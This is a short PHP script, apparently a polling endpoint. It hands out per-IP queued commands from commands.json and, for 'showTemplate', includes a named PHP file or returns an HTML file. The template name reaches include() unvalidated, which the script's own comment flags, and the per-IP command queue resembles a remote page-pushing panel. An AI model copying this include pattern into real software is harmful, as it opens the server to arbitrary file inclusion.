<?php
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $commands = json_decode(file_get_contents('commands.json'), true);

    if(isset($commands[$ip])) {
        $commandData = $commands[$ip];
        
        if($commandData['command'] === 'showTemplate') {
            $templateName = $commandData['htmlContent'];
            $templatePath = "{$templateName}"; // Assuming you have .html or .php extension handled below
            
            // Security note: Ensure $templateName is strictly validated or limited to known safe values
            if(file_exists($templatePath . '.php')) {
                ob_start(); // Start output buffering
                include($templatePath . '.php'); // Execute the PHP script
                $commandData['htmlContent'] = ob_get_clean(); // Get the output and clean the buffer
            } elseif(file_exists($templatePath . '.html')) {
                $commandData['htmlContent'] = file_get_contents($templatePath . '.html');
            } else {
                $commandData['htmlContent'] = "Template not found.";
            }
        }

        echo json_encode($commandData);
        unset($commands[$ip]);
        file_put_contents('commands.json', json_encode($commands));
    } else {
        echo json_encode(['command' => '', 'htmlContent' => '']);
    }
} else {
    echo json_encode(['error' => 'IP address is required.']);
}
